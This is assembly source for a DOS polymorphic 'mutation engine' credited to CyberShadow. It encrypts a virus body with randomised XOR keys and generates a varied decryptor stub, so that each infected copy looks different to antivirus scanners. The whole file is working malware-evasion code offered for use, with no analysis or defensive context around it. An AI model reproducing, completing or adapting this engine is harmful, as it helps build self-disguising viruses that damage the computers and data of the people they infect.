;Little mutation engine v1.0 by CyberShadow
;Input:
;	DS:SI - source
;	ES:DI - destination
;	CX    - length
;Changing:
;	DS goes to ES
;Output:
;	DS:DX - source
;	CX    - length
;	other REGS are same

mutator:
	push ax bx di si bp
	call GetOffset
GetOffset:
	pop bp
	sub bp,offset GetOffset
	in al,40h
	mov byte ptr cs:[bp+rnd_1-2],al
	call rnd
	xor ah,ah
	add cx,ax
	add cx,4
	mov cs:[bp+cx_],cx
	sub cx,4
	call rnd
	and al,3
	mov cs:[bp+byteADD],al
	call rnd
	and al,3
;0-CS,1-ES,2-DS,3-ES/DS
	mov cs:[bp+byteSEG],al
	call rnd	;get XOR code
	mov cs:[bp+xorKEY],al
	call rnd	;get XOR code1
	mov byte ptr cs:[bp+Code1st],al
	call rnd	;get XOR code2
	mov byte ptr cs:[bp+Code2nd],al
	mov word ptr cs:[bp+DecodeLength],cx

	push di
	mov ax,0e860h
	stosw
	mov ax,cx
	add ax,Decoder2Len
	stosw
;-------------------------------------- Crypt 2nd decryptor
	push cx cx si ds
	push cs
	pop ds
	lea si,cs:[bp+Decoder2nd]
	mov cx,Decoder2Len
loopCrypt:
	lodsb
	xor al,byte ptr cs:[bp+xorKEY]
	stosb
	dec cx
	jne loopCrypt
	pop ds si cx
;-------------------------------------- Crypt virusBody
	mov bl,byte ptr cs:[bp+Code1st]
loopCrypt1:
	lodsb
	xor al,bl
	add bl,byte ptr cs:[bp+Code2nd]
	stosb
	dec cx
	jne loopCrypt1

	pop cx
	mov cs:[bp+XORlen],cx

	mov al,cs:[bp+byteADD]
	add al,4
	cmp al,4
	jne noBX
	dec al
noBX:
	mov cs:[bp+byteADDreg],al
	add al,58h
	stosb			;Set POP reg
	sub al,8
	stosb
	mov al,33h
	stosb
	mov si,offset SEGtable
	mov al,byte ptr cs:[bp+byteADD]
	inc al
	and al,3
	xchg bl,al
	xor bh,bh
	call getXORoff
	test byte ptr cs:[bp+byteSEG],1
	jnz checkDS
	mov al,6
	stosb
	mov ax,070eh
	stosw
checkDS:
	test byte ptr cs:[bp+byteSEG],2
	jnz checkDSES
	mov al,1eh
	stosb
	mov ax,1f0eh
	stosw
checkDSES:
;Copying decriptor
	push di
	call setCommand
	mov al,cs:[bp+byteADDreg]
	add al,40h
	stosb
	sub al,40h
	mov al,cs:[bp+byteADD]
	inc al
	and al,3
	add al,4
	cmp al,4
	jne noBX_
	dec al
noBX_:
	push ax
	add al,40h
	stosb
	pop ax
	mov ah,81h
	add al,0f8h
	xchg ah,al
	stosw
	mov ax,Decoder2Len
	stosw
	pop si
	mov ax,850fh
	stosw
	mov bx,di
	mov ax,si
	sub ax,2
	sub ax,bx
	stosw
	test byte ptr cs:[bp+byteSEG],2
	jnz checkDSES_
	mov al,1fh
	stosb
checkDSES_:
	test byte ptr cs:[bp+byteSEG],1
	jnz checkDS_
	mov al,7
	stosb
checkDS_:
	mov al,0c3h
	stosb
	mov cl,6
markIt:
	call rnd
	and al,15
	add al,'A'
	stosb
	dec cl
	jne markIt
	pop dx
	sub di,dx
	mov cx,di
	push es
	pop ds
	pop bp si di bx ax
	ret
;------------------------------------------
rnd:
	push si
	call rnd_1
	db 0
	db 54
	db 136
rnd_1:
	pop si
	mov al,cs:[si]
	or al,al
	jne rnd_2
rnd_3:
	in al,40h
	or al,al
	je rnd_3
rnd_2:
	add al,cs:[si+1]
	mov cs:[si],al
	add al,cs:[si+2]
	mov cs:[si+1],al
	ror al,1
	mov cs:[si+2],al
	xor ah,ah
	pop si
	ret
;------------------------------------------------
setCommand:
	call rnd
	mov dh,al
	movzx bx,byte ptr cs:[bp+byteSEG]
	add bx,offset tableOfSEG
	add bx,bp
	mov al,cs:[bx]
	cmp byte ptr cs:[bp+byteADD],1
	jne noCorrectBPSEG_
	mov al,2eh
noCorrectBPSEG_:
	and dh,1
	or dh,dh
	jz hardCode
	mov ah,80h
	stosw		;get segment pref
	mov si,offset tableOfXOR
	call getXORoffset
	call getXORoffset_
	mov al,cs:[bp+xorKEY]	;set XOR code
	stosb
	jmp goOutSetCommand
hardCode:
	mov ah,8ah
	stosw
	mov dh,al	;remember segment prefix
	mov si,offset tableOfSetAL
	call getXORoffset
	call getXORoffset_
	call rnd
	test al,1
	mov al,86h
	je changeEX
	mov ah,byte ptr cs:[bp+byteADD]
	or ah,ah
	je changeEX
	inc ah
	and ah,3
	or ah,ah
	je changeEX
	mov al,8ah
changeEX:
	stosb
	mov si,offset tableOfSetEX
getChangeEX:
	call rnd
	and al,7
	cmp al,7
	je getChangeEX
	movzx bx,al
	push ax ax
	call getXORoff
	pop ax
	mov ah,80h
	add al,0f1h
	xchg ah,al
	stosw
	mov al,cs:[bp+xorKEY]
	stosb
	call rnd
	test al,1
	mov al,86h
	je changeEX_
	mov ah,byte ptr cs:[bp+byteADD]
	or ah,ah
	je changeEX_
	inc ah
	and ah,3
	or ah,ah
	je changeEX_
	mov al,8ah
changeEX_:
	stosb
	cmp al,8ah
	pop ax
	je retXORValue
	mov si,offset tableOfSetEX
	movzx bx,al
	call getXORoff
	jmp retXORValueFin
retXORValue:
        add al,0c1h
	stosb
retXORValueFin:
	movzx bx,byte ptr cs:[bp+byteSEG]
	add bx,offset tableOfSEG
	add bx,bp
	mov al,cs:[bx]
	cmp byte ptr cs:[bp+byteADD],1
	jne noCorrectBPSEG_1
	mov al,2eh
noCorrectBPSEG_1:
	mov ah,88h
	stosw
	mov dh,al	;remember segment prefix
	mov si,offset tableOfSetAL
	call getXORoffset
	call getXORoffset_
goOutSetCommand:
	ret
getXORoffset:
	movzx bx,byte ptr cs:[bp+byteADD]
getXORoff:
	add bx,si
	add bx,bp
	mov al,cs:[bx]
	stosb
	ret
getXORoffset_:
	cmp byte ptr cs:[bp+byteADD],1
	jne noBPcorrect
	xor al,al
	stosb
noBPcorrect:
	ret
include decoder2.inc
cx_	dw ?
byteADD	db ?
byteSEG	db ?
xorKEY	db ?
XORlen	dw ?
byteADDreg db ?
tableOfSEG db 2eh,3eh,26h,2eh
tableOfXOR db 37h,76h,34h,35h
tableOfSetAL db 7,46h,4,5
tableOfSetEX db 0c8h,0d0h,0d8h,0e0h,0e8h,0f0h,0f8h
SEGtable db 0dbh,0edh,0f6h,0ffh
